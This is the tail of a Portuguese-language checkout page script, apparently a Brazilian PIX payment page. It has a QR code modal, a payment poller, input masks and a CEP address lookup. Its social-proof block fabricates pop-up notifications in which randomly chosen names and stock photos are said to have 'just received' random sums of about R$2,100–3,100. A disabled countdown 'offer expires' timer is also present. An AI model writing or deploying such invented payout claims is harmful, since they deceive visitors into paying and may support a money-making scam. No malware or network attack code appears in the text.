                        modalContent.innerHTML = '<h2 style="font-size:2rem;font-weight:bold;">Pagamento Aprovado!</h2><p>Obrigado por sua compra.</p>';
                    }
                }
            }
        } catch (error) {
            console.error('Payment check failed:', error);
        }
    }, 1500);
}

function showPixModal(result) {
    const pixCodeText = result?.pix?.pix_qr_code;
    const transactionHash = result?.hash;
    const amountPaid = result?.amount_paid;

    
    let expirationDate = null;
    const expirationMinutes = 10;
    if (expirationMinutes > 0) {
        expirationDate = new Date(Date.now() + expirationMinutes * 60 * 1000);
    }

    if (!pixCodeText) { throw new Error('Resposta da API inv√°lida.'); }

    pixCodeInputElement.value = pixCodeText;

    if (qrCodeContainer) {
        qrCodeContainer.innerHTML = '';
        qrCodeInstance = new QRCode(qrCodeContainer, {
            text: pixCodeText,
            width: 184,
            height: 184,
            colorDark: "#000000",
            colorLight: "#ffffff",
            correctLevel: QRCode.CorrectLevel.M
        });
    }

    if (pixValorEl) pixValorEl.textContent = formatCurrency(totalAmount);

    if (!expirationDate) {
        const expirationMinutes = 10;
        if (expirationMinutes > 0) {
            expirationDate = new Date(Date.now() + expirationMinutes * 60 * 1000);
        }
    }

    if (modalExpirationEl && expirationDate) {
        modalExpirationEl.textContent = new Date(expirationDate).toLocaleString('pt-BR', {
            day: '2-digit', month: '2-digit', year: 'numeric',
            hour: '2-digit', minute: '2-digit', second: '2-digit'
        }).replace(',', '');
    }

    modal.classList.remove('hidden');
    modal.classList.add('flex');

    if (transactionHash) {
        startPaymentChecker(transactionHash);
    }
}

function copyToClipboard(text, button) {
    if (navigator.clipboard && window.isSecureContext) {
        navigator.clipboard.writeText(text).then(() => {
            const originalText = button.textContent; button.textContent = 'Copiado!';
            setTimeout(() => { button.textContent = originalText; }, 2000);
        }).catch(err => fallbackCopy(text, button));
    } else { fallbackCopy(text, button); }
}
function fallbackCopy(text, button) {
    const ta = document.createElement("textarea"); ta.value = text; ta.style.position = "fixed"; ta.style.opacity = "0"; document.body.appendChild(ta); ta.focus(); ta.select();
    try { if (document.execCommand('copy')) { const ot = button.textContent; button.textContent = 'Copiado!'; setTimeout(() => button.textContent = ot, 2000); } } catch (err) { alert('Falha ao copiar'); }
    document.body.removeChild(ta);
}
if (modal) {
    const closeAndClear = () => {
        modal.classList.add('hidden');
        modal.classList.remove('flex');
        if (_paymentChecker) clearInterval(_paymentChecker);
    };
    modal.addEventListener('click', (e) => { if (e.target === modal) closeAndClear(); });
    if (closeModalBtn) closeModalBtn.addEventListener('click', closeAndClear);
    copyButton.addEventListener('click', () => { const code = pixCodeInputElement.value; if (code) copyToClipboard(code, copyButton); });
}

const phoneInput = document.getElementById('phone-' + UID);
if (phoneInput) {
    phoneInput.addEventListener('input', (e) => { let v = e.target.value.replace(/[^0-9]/g, ''); v = v.replace(/^([0-9]{2})([0-9])/g, '($1) $2'); v = v.replace(/([0-9]{5})([0-9]{4})$/, '$1-$2'); e.target.value = v.substring(0, 15); });
}



const cepInput = document.getElementById('zip_code-' + UID);
if (cepInput) {
    cepInput.addEventListener('blur', () => {
        const cep = cepInput.value.replace(/[^0-9]/g, ''); if (cep.length !== 8) return;
        fetch('https://viacep.com.br/ws/' + cep + '/json/').then(r => r.json()).then(d => {
            if (!d.erro) {
                const street = document.getElementById('street_name-' + UID);
                const neighbor = document.getElementById('neighborhood-' + UID);
                const city = document.getElementById('city-' + UID);
                const state = document.getElementById('state-' + UID);
                const num = document.getElementById('number-' + UID);
                if (street) street.value = d.logradouro;
                if (neighbor) neighbor.value = d.bairro;
                if (city) city.value = d.localidade;
                if (state) state.value = d.uf;
                if (num) num.focus();
            } else { showErrorModal('CEP n√£o encontrado.'); }
        }).catch(e => console.error('Erro CEP', e));
    });
}

const timerDurationInMinutes = 0;
if (timerDurationInMinutes > 0) {
    const timerDisplay = document.getElementById('timer-display-' + UID);
    const timerTextTemplate = 'Esta oferta expira em: {{tempo}}';
    let time = timerDurationInMinutes * 60;
    const interval = setInterval(() => {
        if (time <= 0) { clearInterval(interval); timerDisplay.textContent = "OFERTA ENCERRADA"; if (payButton) { payButton.disabled = true; payButton.style.opacity = '0.5'; } const nextBtn = document.getElementById('next-btn-' + UID); if (nextBtn) { nextBtn.disabled = true; nextBtn.style.opacity = '0.5'; } return; }
        time--; const m = String(Math.floor(time / 60)).padStart(2, '0'); const s = String(time % 60).padStart(2, '0');
        timerDisplay.textContent = timerTextTemplate.replace('{{tempo}}', m + ':' + s);
    }, 1000);
}

const socialProofSettings = {"enabled":true,"names":[],"payoutMessage":"{{name}} acabou de receber {{value}}","payoutMin":2173,"payoutMax":3126,"initialDelay":1,"displayDuration":3,"intervalMin":2,"intervalMax":6};
if (socialProofSettings && socialProofSettings.enabled) {
    const container = document.getElementById('social-proof-container-' + UID);
    const defaultNames = ["Maria", "Jos√©", "Ana", "Jo√£o", "Ant√¥nio", "Francisco", "Carlos", "Paulo", "Pedro", "Lucas", "Luiz", "Marcos", "Gabriel", "Rafael", "Daniel", "Marcelo", "Bruno", "Eduardo", "Felipe", "Sandra", "Camila", "Amanda", "Fernanda", "Patr√≠cia", "Juliana", "Aline", "Mariana", "Vanessa", "Carolina"];
    const names = socialProofSettings.names && socialProofSettings.names.length > 0 ? socialProofSettings.names : defaultNames;

    const getRandomInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;

    const createNotification = () => {
        const name = names[Math.floor(Math.random() * names.length)];
        const value = getRandomInt(socialProofSettings.payoutMin, socialProofSettings.payoutMax);
        const formattedValue = value.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
        const message = socialProofSettings.payoutMessage
            .replace('{{name}}', '<strong>' + name + '</strong>')
            .replace('{{value}}', '<strong>' + formattedValue + '</strong>');

        const notifElement = document.createElement('div');
        notifElement.className = 'social-proof-toast';
        notifElement.innerHTML =
            '<div style="display:flex; align-items:center; gap: 12px;">' +
            '<img src="https://picsum.photos/40/40?random=' + Date.now() + '" alt="User" style="width: 40px; height: 40px; border-radius: 50%; object-fit: cover; flex-shrink: 0;">' +
            '<div style="font-size: 14px; color: #e2e8f0;">' +
            message +
            '<div style="font-size: 12px; color: #94a3b8; margin-top: 2px;">agora mesmo</div>' +
            '</div>' +
            '</div>';

        container.appendChild(notifElement);

        setTimeout(() => {
            notifElement.classList.remove('show');
            setTimeout(() => notifElement.remove(), 500);
        }, (socialProofSettings.displayDuration || 4) * 1000);

        setTimeout(() => notifElement.classList.add('show'), 100);
    };

    const scheduleNextNotification = () => {
        const interval = getRandomInt(socialProofSettings.intervalMin, socialProofSettings.intervalMax) * 1000;
        setTimeout(() => {
            createNotification();
            scheduleNextNotification();
        }, interval);
    };

    setTimeout(scheduleNextNotification, (socialProofSettings.initialDelay || 5) * 1000);


    setTimeout(() => {
        document.querySelectorAll('input[value]:not([value=""])').forEach(input => {
            input.dispatchEvent(new Event('input', { bubbles: true }));

            input.dispatchEvent(new KeyboardEvent('keyup', { bubbles: true }));
        });
    }, 500);
}
}); 
}) (); 
</script>
    <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"337f6a4929e84c8d97436db27956ab18","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
</body>
    </html>
        
